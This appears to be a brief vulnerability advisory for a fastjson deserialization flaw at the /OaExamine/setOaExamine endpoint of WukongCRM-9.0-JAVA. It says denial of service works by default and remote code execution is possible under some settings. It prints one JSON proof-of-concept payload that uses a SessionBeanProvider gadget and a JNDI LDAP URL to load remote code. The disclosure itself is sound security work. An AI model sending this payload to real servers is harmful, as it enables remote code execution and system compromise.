# [WukongCRM-9.0-JAVA](https://github.com/WuKongOpenSource/WukongCRM-9.0-JAVA)

## fastjson deserialization vulnerability

Similar to CVE-2024-23052，The /OaExamine/setOaExamine path of WukongCRM-9.0-JAVA also has a fastjson deserialization vulnerability.

Class：OaExamineController

Path：/OaExamine/setOaExamine

Directly deserializing the request body may lead to a fastjson deserialization vulnerability:

![image-20250826143725274](images\image-20250826143725274.png)

![image-20250826143717496](images\image-20250826143717496.png)

By default, a deserialization denial of service attack is possible:

![image-20250826143809607](images\image-20250826143809607.png)

With specific dependencies and autoTypeSupport enabled, deserialization can be used to achieve RCE：

```json
{"@type":"org.apache.commons.proxy.provider.remoting.SessionBeanProvider","jndiName":"ldap://localhost:1389/Exploit","Object":"a"}
```

![image-20250826153102932](images\image-20250826153102932.png)


![image-20250826153128766](images\image-20250826153128766.png)
